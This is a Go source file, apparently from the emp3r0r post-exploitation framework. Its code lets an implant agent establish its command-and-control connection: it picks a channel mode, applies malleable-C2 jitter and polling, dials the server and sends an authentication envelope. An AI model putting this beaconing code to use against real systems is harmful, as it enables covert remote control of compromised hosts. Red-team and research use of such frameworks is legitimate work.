package c2transport

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// EstablishC2Connection connects to C2 using the configured wrapper mode.
// All auth is carried in MsgAuth CBOR over SecureConn, independent of wrapper.
func EstablishC2Connection(url, streamID string, capabilities ...string) (conn io.ReadWriteCloser, ctx context.Context, cancel context.CancelFunc, err error) {
	ctx, cancel = context.WithCancel(context.Background())
	mode := common.RuntimeConfig.C2ChannelMode
	if mode == "" {
		mode = def.C2ChannelModeDefault
	}
	channelWrapper, resolveErr := transport.GetC2ChannelWrapper(mode)
	if resolveErr != nil {
		available := strings.Join(transport.AllC2ChannelModes(), ",")
		cancel()
		return nil, nil, nil, fmt.Errorf("unsupported c2 channel mode %q (available: %s)", mode, available)
	}
	if mode == def.C2ChannelModePlainHTTP {
		if w, ok := channelWrapper.(*transport.HTTPChannelWrapper); ok {
			w.Config = &common.RuntimeConfig.MalleableC2
			w.PollInterval = common.RuntimeConfig.PollInterval
			w.Jitter = common.RuntimeConfig.Jitter
		}
	}
	logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)

	conn, err = establishChannelStream(ctx, url, channelWrapper)
	if err != nil {
		cancel()
		return nil, nil, nil, err
	}

	caps, capErr := normalizeMsgAuthCapabilities(capabilities)
	if capErr != nil {
		err = fmt.Errorf("normalize MsgAuth capabilities: %w", capErr)
		_ = conn.Close()
		cancel()
		return nil, nil, nil, err
	}

	secureConn := transport.NewSecureConn(conn)
	if sendErr := sendMsgAuthEnvelope(secureConn, caps, streamID); sendErr != nil {
		err = fmt.Errorf("send MsgAuth: %w", sendErr)
		_ = conn.Close()
		cancel()
		return nil, nil, nil, err
	}

	return conn, ctx, cancel, nil
}

func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
	if def.HTTPClient == nil {
		return nil, fmt.Errorf("http client is not initialized")
	}

	type connectResult struct {
		stream io.ReadWriteCloser
		resp   *http.Response
		err    error
	}
	resultChan := make(chan connectResult, 1)
	go func() {
		stream, r, e := channelWrapper.Dial(ctx, def.HTTPClient, url)
		resultChan <- connectResult{stream: stream, resp: r, err: e}
	}()

	select {
	case res := <-resultChan:
		if res.err != nil {
			return nil, fmt.Errorf("initiate channel stream: %w", res.err)
		}
		if res.resp != nil && res.resp.StatusCode != http.StatusOK {
			_ = res.stream.Close()
			return nil, fmt.Errorf("bad status code: %d", res.resp.StatusCode)
		}
		return res.stream, nil
	case <-time.After(10 * time.Second):
		return nil, fmt.Errorf("establish channel stream timeout")
	}
}

func normalizeMsgAuthCapabilities(capabilities []string) ([]string, error) {
	seen := make(map[string]struct{}, len(capabilities)+1)
	normalized := make([]string, 0, len(capabilities)+1)
	for _, cap := range capabilities {
		if cap == "" {
			continue
		}
		if _, ok := seen[cap]; ok {
			continue
		}
		seen[cap] = struct{}{}
		normalized = append(normalized, cap)
	}
	if len(normalized) == 0 {
		return nil, fmt.Errorf("at least one explicit MsgAuth capability is required")
	}
	return normalized, nil
}
